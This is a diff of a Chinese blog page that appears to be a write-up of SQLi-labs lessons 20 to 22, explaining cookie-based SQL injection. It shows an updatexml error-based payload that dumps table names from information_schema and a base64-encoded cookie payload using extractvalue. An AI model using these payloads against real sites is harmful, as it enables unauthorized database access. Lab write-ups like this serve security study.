@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="less 20 and less 21, Shelly、夏风">
+    <meta name="keywords" content="less 20 and less 21 and less22, Shelly、夏风">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>less 20 and less 21 | Shelly、夏风</title>
+    <title>less 20 and less 21 and less22 | Shelly、夏风</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">less 20 and less 21</h1>
+                    <h1 class="description center-align post-title">less 20 and less 21 and less22</h1>
                 </div>
             </div>
         </div>
@@ -465,7 +465,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>从源代码中我们可以看到COOKIE从username中获得值后，当再次刷新时，会从COOKIE中读取username，然后进行查询。<br>登录成功之后，我们可以修改cookie,当再次刷新的时候，这时候sql语句就会被修改，我们使用updatexml进行破解。<br><img src="https://s2.loli.net/2022/02/24/PQgf5lWRc74j2m3.png" alt="1.png"></p>
+                <p>从源代码中我们可以看到COOKIE从username中获得值后，当再次刷新时，会从COOKIE中读取username，然后进行查询。<br>登陆后将uname写入Cookie。<br>在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取Cookie中字段uname。在数据库中按username查询，若用户存在则将查询到用户id、username、password回显；<br>可以判断出注入点就在Cookie处.<br>登录成功之后，我们可以修改cookie,当再次刷新的时候，这时候sql语句就会被修改，我们使用updatexml进行破解。<br><img src="https://s2.loli.net/2022/02/24/PQgf5lWRc74j2m3.png" alt="1.png"></p>
 <pre><code>dhakkan’ and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),&#39;~&#39;),1)#
 </code></pre>
 <p><img src="https://s2.loli.net/2022/02/24/CPjQtOaqcyz56EN.png" alt="2.png"></p>
@@ -476,6 +476,7 @@
 </code></pre>
 <p><img src="https://s2.loli.net/2022/02/24/Cr9PHNa326Osvyx.png" alt="4.png"></p>
 <p>less 21这里的界面和上一关的内容差不多，唯一的区别就是cookie使用了base64进行了加密<br>我们这里与上一关一样，修改cookie即可，唯一的附加内容就是将cookie进行base64加密：<br>cookie值为：<br>    YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</p>
+<p>less 22与less 21不同为此题为”而上一题为’)，其余爆破的方式相同。</p>
 
                 
             </div>
